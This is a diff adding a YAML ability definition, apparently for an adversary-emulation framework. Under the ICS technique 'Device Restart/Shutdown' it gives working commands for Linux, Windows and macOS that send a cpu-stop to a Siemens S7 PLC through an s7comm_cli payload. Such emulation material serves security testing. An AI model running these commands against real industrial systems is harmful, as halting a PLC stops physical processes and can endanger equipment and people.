@@ -1,0 +1,29 @@
+---
+
+- id: fb37176c-4cf6-4576-8f1d-e55e65c75737
+  name: S7comm - Stop CPU
+  description: |
+    Stop a Siemens S7 CPU (S7 PLC Stop). Halts the control program, denying the
+    process its automation and inhibiting the device's response.
+  tactic: inhibit-response-function
+  technique_id: T0816
+  technique_name: Device Restart/Shutdown
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      ./s7comm_cli #{s7comm.server.ip} --rack #{s7comm.rack} --slot #{s7comm.slot} --port #{s7comm.server.port} cpu-stop
+    payloads:
+    - s7comm_cli
+  - platform: windows
+    name: psh
+    command: >
+      .\s7comm_cli.exe #{s7comm.server.ip} --rack #{s7comm.rack} --slot #{s7comm.slot} --port #{s7comm.server.port} cpu-stop
+    payloads:
+    - s7comm_cli.exe
+  - platform: darwin
+    name: sh
+    command: >
+      ./s7comm_cli_darwin #{s7comm.server.ip} --rack #{s7comm.rack} --slot #{s7comm.slot} --port #{s7comm.server.port} cpu-stop
+    payloads:
+    - s7comm_cli_darwin
